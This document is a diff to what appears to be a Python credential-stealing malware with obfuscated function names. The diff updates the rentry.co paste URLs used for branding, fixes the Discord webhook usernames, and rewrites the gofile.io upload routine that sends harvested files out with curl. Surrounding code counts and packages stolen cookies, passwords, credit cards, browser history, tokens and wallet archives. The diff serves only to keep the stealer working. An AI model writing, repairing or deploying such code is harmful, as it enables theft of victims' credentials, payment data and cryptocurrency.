@@ -102,11 +102,11 @@ cname = "https://rentry.co/u4tup/raw"
 cnameresp = requests.get(cname)
 cname = cnameresp.text
 
-smallcname = "https://rentry.co/5crcu/raw"
+smallcname = "https://rentry.co/u7hcdw7r/raw"
 smallcnameresp = requests.get(smallcname)
 smallcname = smallcnameresp.text
 
-footerc = "https://rentry.co/pmpxa/raw"
+footerc = "https://rentry.co/n9t3khws/raw"
 footercresp = requests.get(footerc)
 footerc = footercresp.text
 
@@ -517,7 +517,7 @@ def UP104D70K3N(token, path):
                 }
             }
         ],
-        "username": f"{cname} | t.me/{smallcname}r",
+        "username": f"{cname} | t.me/{smallcname}",
         "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
         "attachments": []
         }
@@ -550,7 +550,7 @@ def UP104D(name, link):
                 },
                 }
             ],
-            "username": f"{cname} | t.me/{smallcname}r",
+            "username": f"{cname} | t.me/{smallcname}",
             "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
             "attachments": []
             }
@@ -582,7 +582,7 @@ def UP104D(name, link):
                 }
                 }
             ],
-            "username": f"{cname} | t.me/{smallcname}r",
+            "username": f"{cname} | t.me/{smallcname}",
             "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
             "attachments": []
             }
@@ -824,7 +824,7 @@ def G378r0W53r5(br0W53rP47H5):
                 "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
             }
         ],
-        "username": f"{cname} | t.me/{smallcname}r",
+        "username": f"{cname} | t.me/{smallcname}",
         "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
         "attachments": []
     }
@@ -902,7 +902,7 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             }
             }
         ],
-        "username": f"{cname} | t.me/{smallcname}r",
+        "username": f"{cname} | t.me/{smallcname}",
         "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
         "attachments": []
     }
@@ -1033,9 +1033,17 @@ def G47H3r411():
     
 def UP104D7060F113(path):
     try:
-        r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
-        return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
-    except: return False
+        servers = requests.get("https://api.gofile.io/servers").json()["data"]["servers"]
+        
+        if servers:
+            selected_server = servers[0]["name"]
+            upload_url = f'https://{selected_server}.gofile.io/uploadFile'
+            r = subprocess.Popen(f'curl -F "file=@{path}" {upload_url}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+            
+            return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
 
 def K1W1F01D3r(pathF, keywords):
     global K1W1F113s
@@ -1219,8 +1227,10 @@ k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[
 C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
 c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157, K1W1F113s, B00KM4rK5, T0K3Ns = [], [], [], [], [], [], [], [], [], [], [], [], [], ''
 
-try:gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
-except:gofileserver = "store4"
+try:
+    gofileserver = requests.get("https://api.gofile.io/servers").json()["data"]["servers"][0]["name"]
+except:
+    gofileserver = "store4"
 GLINFO = G108411NF0()
 
 
